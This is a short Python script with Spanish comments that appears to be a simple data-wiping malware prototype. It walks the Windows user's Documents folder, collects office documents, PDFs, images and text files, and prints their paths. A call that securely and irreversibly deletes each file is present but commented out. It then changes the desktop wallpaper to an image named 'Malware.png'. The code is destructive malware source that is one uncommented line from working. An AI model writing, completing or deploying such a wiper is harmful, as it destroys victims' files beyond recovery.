import os
import secure_delete
import re
from wallpaper import cambiarFondo

archivos = []
pattern = re.compile(r'.*\.(docx|xlsx|pdf|jpeg|jpg|txt)$')

# Para listar los archivos en la carpeta Documents del usuario
def listar_archivos_documentos(lista):
    documentos_path = os.path.join(os.environ["USERPROFILE"], "Documents")
    for root, _, files in os.walk(documentos_path):
        for file in files:
            if pattern.match(file): 
                lista.append(os.path.join(root, file))

listar_archivos_documentos(archivos)

for archivo in archivos:
    print(archivo)
    # secure_delete.delete(archivo)
cambiarFondo("Malware.png")